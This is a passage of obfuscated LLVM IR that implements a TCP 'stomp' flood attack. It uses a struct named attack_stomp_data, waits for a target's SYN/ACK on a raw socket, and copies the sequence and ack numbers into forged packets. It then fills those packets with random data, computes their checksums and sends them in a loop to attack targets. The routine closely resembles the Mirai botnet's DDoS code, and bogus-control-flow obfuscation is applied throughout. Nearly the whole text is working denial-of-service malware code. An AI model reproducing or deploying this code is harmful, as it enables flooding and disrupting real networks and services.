  %278 = call i64 @recvfrom(i32 %272, i8* %273, i64 256, i32 16384, %struct.sockaddr* %277, i32* %29)
  %279 = trunc i64 %278 to i32
  store i32 %279, i32* %33, align 4
  %280 = load i32, i32* %33, align 4
  %281 = icmp eq i32 %280, -1
  br i1 %281, label %282, label %283

; <label>:282:                                    ; preds = %271
  br label %783

; <label>:283:                                    ; preds = %271
  %284 = load i32, i32* @x.29
  %285 = load i32, i32* @y.30
  %286 = sub i32 %284, 1
  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %283
  %292 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %293 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %292, i32 0, i32 0
  %294 = load i32, i32* %293, align 4
  %295 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %296 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %295, i32 0, i32 0
  %297 = load i32, i32* %296, align 4
  %298 = icmp eq i32 %294, %297
  %299 = load i32, i32* @x.29
  %300 = load i32, i32* @y.30
  %301 = sub i32 %299, 1
  %302 = mul i32 %299, %301
  %303 = urem i32 %302, 2
  %304 = icmp eq i32 %303, 0
  %305 = icmp slt i32 %300, 10
  %306 = or i1 %304, %305
  br i1 %306, label %originalBBpart227, label %originalBB24alteredBB

originalBBpart227:                                ; preds = %originalBB24
  br i1 %298, label %307, label %626

; <label>:307:                                    ; preds = %originalBBpart227
  %308 = load i32, i32* %33, align 4
  %309 = sext i32 %308 to i64
  %310 = icmp ugt i64 %309, 40
  br i1 %310, label %311, label %626

; <label>:311:                                    ; preds = %307
  %312 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %313 = getelementptr inbounds i8, i8* %312, i64 20
  %314 = bitcast i8* %313 to %struct.tcphdr*
  store %struct.tcphdr* %314, %struct.tcphdr** %35, align 8
  %315 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %316 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %315, i32 0, i32 0
  %317 = load i16, i16* %316, align 4
  %318 = zext i16 %317 to i32
  %319 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %320 = load i16, i16* %319, align 2
  %321 = zext i16 %320 to i32
  %322 = icmp eq i32 %318, %321
  br i1 %322, label %323, label %625

; <label>:323:                                    ; preds = %311
  %324 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %325 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %324, i32 0, i32 4
  %326 = load i16, i16* %325, align 4
  %327 = lshr i16 %326, 9
  %328 = and i16 %327, 1
  %329 = zext i16 %328 to i32
  %330 = icmp ne i32 %329, 0
  br i1 %330, label %331, label %588

; <label>:331:                                    ; preds = %323
  %332 = load i32, i32* @x.29
  %333 = load i32, i32* @y.30
  %334 = sub i32 %332, 1
  %335 = mul i32 %332, %334
  %336 = urem i32 %335, 2
  %337 = icmp eq i32 %336, 0
  %338 = icmp slt i32 %333, 10
  %339 = or i1 %337, %338
  br i1 %339, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %331
  %340 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %341 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %340, i32 0, i32 4
  %342 = load i16, i16* %341, align 4
  %343 = lshr i16 %342, 12
  %344 = and i16 %343, 1
  %345 = zext i16 %344 to i32
  %346 = icmp ne i32 %345, 0
  %347 = load i32, i32* @x.29
  %348 = load i32, i32* @y.30
  %349 = sub i32 %347, 1
  %350 = mul i32 %347, %349
  %351 = urem i32 %350, 2
  %352 = icmp eq i32 %351, 0
  %353 = icmp slt i32 %348, 10
  %354 = or i1 %352, %353
  br i1 %354, label %originalBBpart251, label %originalBB29alteredBB

originalBBpart251:                                ; preds = %originalBB29
  br i1 %346, label %355, label %588

; <label>:355:                                    ; preds = %originalBBpart251
  %356 = load i32, i32* @x.29
  %357 = load i32, i32* @y.30
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %355
  %364 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %365 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %364, i32 0, i32 0
  %366 = load i32, i32* %365, align 4
  %367 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %368 = load i32, i32* %9, align 4
  %369 = sext i32 %368 to i64
  %370 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %367, i64 %369
  %371 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %370, i32 0, i32 0
  store i32 %366, i32* %371, align 4
  %372 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %373 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %372, i32 0, i32 2
  %374 = load i32, i32* %373, align 4
  %375 = call i32 @ntohl(i32 %374) #7
  %376 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %377 = load i32, i32* %9, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %376, i64 %378
  %380 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %379, i32 0, i32 1
  store i32 %375, i32* %380, align 4
  %381 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %382 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %381, i32 0, i32 3
  %383 = load i32, i32* %382, align 4
  %384 = call i32 @ntohl(i32 %383) #7
  %385 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %386 = load i32, i32* %9, align 4
  %387 = sext i32 %386 to i64
  %388 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %385, i64 %387
  %389 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %388, i32 0, i32 2
  store i32 %384, i32* %389, align 4
  %390 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %391 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %390, i32 0, i32 1
  %392 = load i16, i16* %391, align 2
  %393 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %394 = load i32, i32* %9, align 4
  %395 = sext i32 %394 to i64
  %396 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %393, i64 %395
  %397 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %396, i32 0, i32 3
  store i16 %392, i16* %397, align 4
  %398 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %399 = load i16, i16* %398, align 2
  %400 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %401 = load i32, i32* %9, align 4
  %402 = sext i32 %401 to i64
  %403 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %400, i64 %402
  %404 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %403, i32 0, i32 4
  store i16 %399, i16* %404, align 2
  %405 = load i32, i32* %24, align 4
  %406 = sext i32 %405 to i64
  %407 = add i64 40, %406
  %408 = call noalias i8* @malloc(i64 %407) #6
  %409 = load i8**, i8*** %12, align 8
  %410 = load i32, i32* %9, align 4
  %411 = sext i32 %410 to i64
  %412 = getelementptr inbounds i8*, i8** %409, i64 %411
  store i8* %408, i8** %412, align 8
  %413 = load i8**, i8*** %12, align 8
  %414 = load i32, i32* %9, align 4
  %415 = sext i32 %414 to i64
  %416 = getelementptr inbounds i8*, i8** %413, i64 %415
  %417 = load i8*, i8** %416, align 8
  %418 = bitcast i8* %417 to %struct.iphdr*
  store %struct.iphdr* %418, %struct.iphdr** %36, align 8
  %419 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %420 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %419, i64 1
  %421 = bitcast %struct.iphdr* %420 to %struct.tcphdr*
  store %struct.tcphdr* %421, %struct.tcphdr** %37, align 8
  %422 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %423 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %422, i64 1
  %424 = bitcast %struct.tcphdr* %423 to i8*
  store i8* %424, i8** %38, align 8
  %425 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %426 = bitcast %struct.iphdr* %425 to i8*
  %427 = load i8, i8* %426, align 4
  %428 = and i8 %427, 15
  %429 = or i8 %428, 64
  store i8 %429, i8* %426, align 4
  %430 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %431 = bitcast %struct.iphdr* %430 to i8*
  %432 = load i8, i8* %431, align 4
  %433 = and i8 %432, -16
  %434 = or i8 %433, 5
  store i8 %434, i8* %431, align 4
  %435 = load i8, i8* %13, align 1
  %436 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %437 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %436, i32 0, i32 1
  store i8 %435, i8* %437, align 1
  %438 = load i32, i32* %24, align 4
  %439 = sext i32 %438 to i64
  %440 = add i64 40, %439
  %441 = trunc i64 %440 to i16
  %442 = call zeroext i16 @htons(i16 zeroext %441) #7
  %443 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %444 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %443, i32 0, i32 2
  store i16 %442, i16* %444, align 2
  %445 = load i16, i16* %14, align 2
  %446 = call zeroext i16 @htons(i16 zeroext %445) #7
  %447 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %448 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %447, i32 0, i32 3
  store i16 %446, i16* %448, align 4
  %449 = load i8, i8* %15, align 1
  %450 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %451 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %450, i32 0, i32 5
  store i8 %449, i8* %451, align 4
  %452 = load i8, i8* %16, align 1
  %453 = icmp ne i8 %452, 0
  %454 = load i32, i32* @x.29
  %455 = load i32, i32* @y.30
  %456 = sub i32 %454, 1
  %457 = mul i32 %454, %456
  %458 = urem i32 %457, 2
  %459 = icmp eq i32 %458, 0
  %460 = icmp slt i32 %455, 10
  %461 = or i1 %459, %460
  br i1 %461, label %originalBBpart297, label %originalBB53alteredBB

originalBBpart297:                                ; preds = %originalBB53
  br i1 %453, label %462, label %466

; <label>:462:                                    ; preds = %originalBBpart297
  %463 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %464 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %465 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %464, i32 0, i32 4
  store i16 %463, i16* %465, align 2
  br label %466

; <label>:466:                                    ; preds = %462, %originalBBpart297
  %467 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %468 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %467, i32 0, i32 6
  store i8 6, i8* %468, align 1
  %469 = load i32, i32* @LOCAL_ADDR, align 4
  %470 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %471 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %470, i32 0, i32 8
  store i32 %469, i32* %471, align 4
  %472 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %473 = load i32, i32* %9, align 4
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %472, i64 %474
  %476 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %475, i32 0, i32 0
  %477 = load i32, i32* %476, align 4
  %478 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %479 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %478, i32 0, i32 9
  store i32 %477, i32* %479, align 4
  %480 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %481 = load i32, i32* %9, align 4
  %482 = sext i32 %481 to i64
  %483 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %480, i64 %482
  %484 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %483, i32 0, i32 3
  %485 = load i16, i16* %484, align 4
  %486 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %487 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %486, i32 0, i32 0
  store i16 %485, i16* %487, align 4
  %488 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %489 = load i32, i32* %9, align 4
  %490 = sext i32 %489 to i64
  %491 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %488, i64 %490
  %492 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %491, i32 0, i32 4
  %493 = load i16, i16* %492, align 2
  %494 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %495 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %494, i32 0, i32 1
  store i16 %493, i16* %495, align 2
  %496 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %497 = load i32, i32* %9, align 4
  %498 = sext i32 %497 to i64
  %499 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %496, i64 %498
  %500 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %499, i32 0, i32 2
  %501 = load i32, i32* %500, align 4
  %502 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %503 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %502, i32 0, i32 2
  store i32 %501, i32* %503, align 4
  %504 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %505 = load i32, i32* %9, align 4
  %506 = sext i32 %505 to i64
  %507 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %504, i64 %506
  %508 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %507, i32 0, i32 1
  %509 = load i32, i32* %508, align 4
  %510 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %511 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %510, i32 0, i32 3
  store i32 %509, i32* %511, align 4
  %512 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %513 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %512, i32 0, i32 4
  %514 = load i16, i16* %513, align 4
  %515 = and i16 %514, -241
  %516 = or i16 %515, 128
  store i16 %516, i16* %513, align 4
  %517 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %518 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %517, i32 0, i32 4
  %519 = load i16, i16* %518, align 4
  %520 = and i16 %519, -257
  %521 = or i16 %520, 256
  store i16 %521, i16* %518, align 4
  %522 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %523 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %522, i32 0, i32 4
  %524 = load i16, i16* %523, align 4
  %525 = and i16 %524, -4097
  %526 = or i16 %525, 4096
  store i16 %526, i16* %523, align 4
  %527 = call i32 @rand_next()
  %528 = and i32 %527, 65535
  %529 = trunc i32 %528 to i16
  %530 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %531 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %530, i32 0, i32 5
  store i16 %529, i16* %531, align 2
  %532 = load i8, i8* %18, align 1
  %533 = sext i8 %532 to i16
  %534 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %535 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %534, i32 0, i32 4
  %536 = load i16, i16* %535, align 4
  %537 = and i16 %533, 1
  %538 = shl i16 %537, 13
  %539 = and i16 %536, -8193
  %540 = or i16 %539, %538
  store i16 %540, i16* %535, align 4
  %541 = load i8, i8* %19, align 1
  %542 = sext i8 %541 to i16
  %543 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %544 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %543, i32 0, i32 4
  %545 = load i16, i16* %544, align 4
  %546 = and i16 %542, 1
  %547 = shl i16 %546, 12
  %548 = and i16 %545, -4097
  %549 = or i16 %548, %547
  store i16 %549, i16* %544, align 4
  %550 = load i8, i8* %20, align 1
  %551 = sext i8 %550 to i16
  %552 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %553 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %552, i32 0, i32 4
  %554 = load i16, i16* %553, align 4
  %555 = and i16 %551, 1
  %556 = shl i16 %555, 11
  %557 = and i16 %554, -2049
  %558 = or i16 %557, %556
  store i16 %558, i16* %553, align 4
  %559 = load i8, i8* %21, align 1
  %560 = sext i8 %559 to i16
  %561 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %562 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %561, i32 0, i32 4
  %563 = load i16, i16* %562, align 4
  %564 = and i16 %560, 1
  %565 = shl i16 %564, 10
  %566 = and i16 %563, -1025
  %567 = or i16 %566, %565
  store i16 %567, i16* %562, align 4
  %568 = load i8, i8* %22, align 1
  %569 = sext i8 %568 to i16
  %570 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %571 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %570, i32 0, i32 4
  %572 = load i16, i16* %571, align 4
  %573 = and i16 %569, 1
  %574 = shl i16 %573, 9
  %575 = and i16 %572, -513
  %576 = or i16 %575, %574
  store i16 %576, i16* %571, align 4
  %577 = load i8, i8* %23, align 1
  %578 = sext i8 %577 to i16
  %579 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %580 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %579, i32 0, i32 4
  %581 = load i16, i16* %580, align 4
  %582 = and i16 %578, 1
  %583 = shl i16 %582, 8
  %584 = and i16 %581, -257
  %585 = or i16 %584, %583
  store i16 %585, i16* %580, align 4
  %586 = load i8*, i8** %38, align 8
  %587 = load i32, i32* %24, align 4
  call void @rand_str(i8* %586, i32 %587)
  br label %635

; <label>:588:                                    ; preds = %originalBBpart251, %323
  %589 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %590 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %589, i32 0, i32 4
  %591 = load i16, i16* %590, align 4
  %592 = lshr i16 %591, 8
  %593 = and i16 %592, 1
  %594 = zext i16 %593 to i32
  %595 = icmp ne i32 %594, 0
  br i1 %595, label %604, label %596

; <label>:596:                                    ; preds = %588
  %597 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %598 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %597, i32 0, i32 4
  %599 = load i16, i16* %598, align 4
  %600 = lshr i16 %599, 10
  %601 = and i16 %600, 1
  %602 = zext i16 %601 to i32
  %603 = icmp ne i32 %602, 0
  br i1 %603, label %604, label %623

; <label>:604:                                    ; preds = %596, %588
  %605 = load i32, i32* @x.29
  %606 = load i32, i32* @y.30
  %607 = sub i32 %605, 1
  %608 = mul i32 %605, %607
  %609 = urem i32 %608, 2
  %610 = icmp eq i32 %609, 0
  %611 = icmp slt i32 %606, 10
  %612 = or i1 %610, %611
  br i1 %612, label %originalBB99, label %originalBB99alteredBB

originalBB99:                                     ; preds = %originalBB99alteredBB, %604
  %613 = load i32, i32* %26, align 4
  %614 = call i32 @close(i32 %613)
  %615 = load i32, i32* @x.29
  %616 = load i32, i32* @y.30
  %617 = sub i32 %615, 1
  %618 = mul i32 %615, %617
  %619 = urem i32 %618, 2
  %620 = icmp eq i32 %619, 0
  %621 = icmp slt i32 %616, 10
  %622 = or i1 %620, %621
  br i1 %622, label %originalBBpart2101, label %originalBB99alteredBB

originalBBpart2101:                               ; preds = %originalBB99
  br label %169

; <label>:623:                                    ; preds = %596
  br label %624

; <label>:624:                                    ; preds = %623
  br label %625

; <label>:625:                                    ; preds = %624, %311
  br label %626

; <label>:626:                                    ; preds = %625, %307, %originalBBpart227
  %627 = call i64 @time(i64* null) #6
  %628 = load i64, i64* %31, align 8
  %629 = sub nsw i64 %627, %628
  %630 = icmp sgt i64 %629, 10
  br i1 %630, label %631, label %634

; <label>:631:                                    ; preds = %626
  %632 = load i32, i32* %26, align 4
  %633 = call i32 @close(i32 %632)
  br label %169

; <label>:634:                                    ; preds = %626
  br label %271

; <label>:635:                                    ; preds = %466
  br label %636

; <label>:636:                                    ; preds = %635, %originalBBpart212
  %637 = load i32, i32* %9, align 4
  %638 = add nsw i32 %637, 1
  store i32 %638, i32* %9, align 4
  br label %147

; <label>:639:                                    ; preds = %originalBBpart28
  br label %640

; <label>:640:                                    ; preds = %782, %639
  store i32 0, i32* %9, align 4
  br label %641

; <label>:641:                                    ; preds = %779, %640
  %642 = load i32, i32* @x.29
  %643 = load i32, i32* @y.30
  %644 = sub i32 %642, 1
  %645 = mul i32 %642, %644
  %646 = urem i32 %645, 2
  %647 = icmp eq i32 %646, 0
  %648 = icmp slt i32 %643, 10
  %649 = or i1 %647, %648
  br i1 %649, label %originalBB103, label %originalBB103alteredBB

originalBB103:                                    ; preds = %originalBB103alteredBB, %641
  %650 = load i32, i32* %9, align 4
  %651 = load i8, i8* %5, align 1
  %652 = zext i8 %651 to i32
  %653 = icmp slt i32 %650, %652
  %654 = load i32, i32* @x.29
  %655 = load i32, i32* @y.30
  %656 = sub i32 %654, 1
  %657 = mul i32 %654, %656
  %658 = urem i32 %657, 2
  %659 = icmp eq i32 %658, 0
  %660 = icmp slt i32 %655, 10
  %661 = or i1 %659, %660
  br i1 %661, label %originalBBpart2105, label %originalBB103alteredBB

originalBBpart2105:                               ; preds = %originalBB103
  br i1 %653, label %662, label %782

; <label>:662:                                    ; preds = %originalBBpart2105
  %663 = load i8**, i8*** %12, align 8
  %664 = load i32, i32* %9, align 4
  %665 = sext i32 %664 to i64
  %666 = getelementptr inbounds i8*, i8** %663, i64 %665
  %667 = load i8*, i8** %666, align 8
  store i8* %667, i8** %39, align 8
  %668 = load i8*, i8** %39, align 8
  %669 = bitcast i8* %668 to %struct.iphdr*
  store %struct.iphdr* %669, %struct.iphdr** %40, align 8
  %670 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %671 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %670, i64 1
  %672 = bitcast %struct.iphdr* %671 to %struct.tcphdr*
  store %struct.tcphdr* %672, %struct.tcphdr** %41, align 8
  %673 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %674 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %673, i64 1
  %675 = bitcast %struct.tcphdr* %674 to i8*
  store i8* %675, i8** %42, align 8
  %676 = load i16, i16* %14, align 2
  %677 = zext i16 %676 to i32
  %678 = icmp eq i32 %677, 65535
  br i1 %678, label %679, label %685

; <label>:679:                                    ; preds = %662
  %680 = call i32 @rand_next()
  %681 = and i32 %680, 65535
  %682 = trunc i32 %681 to i16
  %683 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %684 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %683, i32 0, i32 3
  store i16 %682, i16* %684, align 4
  br label %685

; <label>:685:                                    ; preds = %679, %662
  %686 = load i8, i8* %25, align 1
  %687 = icmp ne i8 %686, 0
  br i1 %687, label %688, label %707

; <label>:688:                                    ; preds = %685
  %689 = load i32, i32* @x.29
  %690 = load i32, i32* @y.30
  %691 = sub i32 %689, 1
  %692 = mul i32 %689, %691
  %693 = urem i32 %692, 2
  %694 = icmp eq i32 %693, 0
  %695 = icmp slt i32 %690, 10
  %696 = or i1 %694, %695
  br i1 %696, label %originalBB107, label %originalBB107alteredBB

originalBB107:                                    ; preds = %originalBB107alteredBB, %688
  %697 = load i8*, i8** %42, align 8
  %698 = load i32, i32* %24, align 4
  call void @rand_str(i8* %697, i32 %698)
  %699 = load i32, i32* @x.29
  %700 = load i32, i32* @y.30
  %701 = sub i32 %699, 1
  %702 = mul i32 %699, %701
  %703 = urem i32 %702, 2
  %704 = icmp eq i32 %703, 0
  %705 = icmp slt i32 %700, 10
  %706 = or i1 %704, %705
  br i1 %706, label %originalBBpart2109, label %originalBB107alteredBB

originalBBpart2109:                               ; preds = %originalBB107
  br label %707

; <label>:707:                                    ; preds = %originalBBpart2109, %685
  %708 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %709 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %708, i32 0, i32 7
  store i16 0, i16* %709, align 2
  %710 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %711 = bitcast %struct.iphdr* %710 to i16*
  %712 = call zeroext i16 @checksum_generic(i16* %711, i32 20)
  %713 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %714 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %713, i32 0, i32 7
  store i16 %712, i16* %714, align 2
  %715 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %716 = load i32, i32* %9, align 4
  %717 = sext i32 %716 to i64
  %718 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %715, i64 %717
  %719 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %718, i32 0, i32 1
  %720 = load i32, i32* %719, align 4
  %721 = add i32 %720, 1
  store i32 %721, i32* %719, align 4
  %722 = trunc i32 %720 to i16
  %723 = call zeroext i16 @htons(i16 zeroext %722) #7
  %724 = zext i16 %723 to i32
  %725 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %726 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %725, i32 0, i32 2
  store i32 %724, i32* %726, align 4
  %727 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %728 = load i32, i32* %9, align 4
  %729 = sext i32 %728 to i64
  %730 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %727, i64 %729
  %731 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %730, i32 0, i32 2
  %732 = load i32, i32* %731, align 4
  %733 = trunc i32 %732 to i16
  %734 = call zeroext i16 @htons(i16 zeroext %733) #7
  %735 = zext i16 %734 to i32
  %736 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %737 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %736, i32 0, i32 3
  store i32 %735, i32* %737, align 4
  %738 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %739 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %738, i32 0, i32 6
  store i16 0, i16* %739, align 4
  %740 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %741 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %742 = bitcast %struct.tcphdr* %741 to i8*
  %743 = load i32, i32* %24, align 4
  %744 = sext i32 %743 to i64
  %745 = add i64 20, %744
  %746 = trunc i64 %745 to i16
  %747 = call zeroext i16 @htons(i16 zeroext %746) #7
  %748 = load i32, i32* %24, align 4
  %749 = sext i32 %748 to i64
  %750 = add i64 20, %749
  %751 = trunc i64 %750 to i32
  %752 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %740, i8* %742, i16 zeroext %747, i32 %751)
  %753 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %754 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %753, i32 0, i32 6
  store i16 %752, i16* %754, align 4
  %755 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %756 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %755, i32 0, i32 1
  %757 = load i16, i16* %756, align 2
  %758 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %759 = load i32, i32* %9, align 4
  %760 = sext i32 %759 to i64
  %761 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %758, i64 %760
  %762 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %761, i32 0, i32 0
  %763 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %762, i32 0, i32 1
  store i16 %757, i16* %763, align 2
  %764 = load i32, i32* %10, align 4
  %765 = load i8*, i8** %39, align 8
  %766 = load i32, i32* %24, align 4
  %767 = sext i32 %766 to i64
  %768 = add i64 40, %767
  %769 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %770 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %771 = load i32, i32* %9, align 4
  %772 = sext i32 %771 to i64
  %773 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %770, i64 %772
  %774 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %773, i32 0, i32 0
  %775 = bitcast %struct.sockaddr_in* %774 to %struct.sockaddr*
  store %struct.sockaddr* %775, %struct.sockaddr** %769, align 8
  %776 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %777 = load %struct.sockaddr*, %struct.sockaddr** %776, align 8
  %778 = call i64 @sendto(i32 %764, i8* %765, i64 %768, i32 16384, %struct.sockaddr* %777, i32 16)
  br label %779

; <label>:779:                                    ; preds = %707
  %780 = load i32, i32* %9, align 4
  %781 = add nsw i32 %780, 1
  store i32 %781, i32* %9, align 4
  br label %641

; <label>:782:                                    ; preds = %originalBBpart2105
  br label %640

; <label>:783:                                    ; preds = %282, %143, %originalBBpart2
  %784 = load i32, i32* @x.29
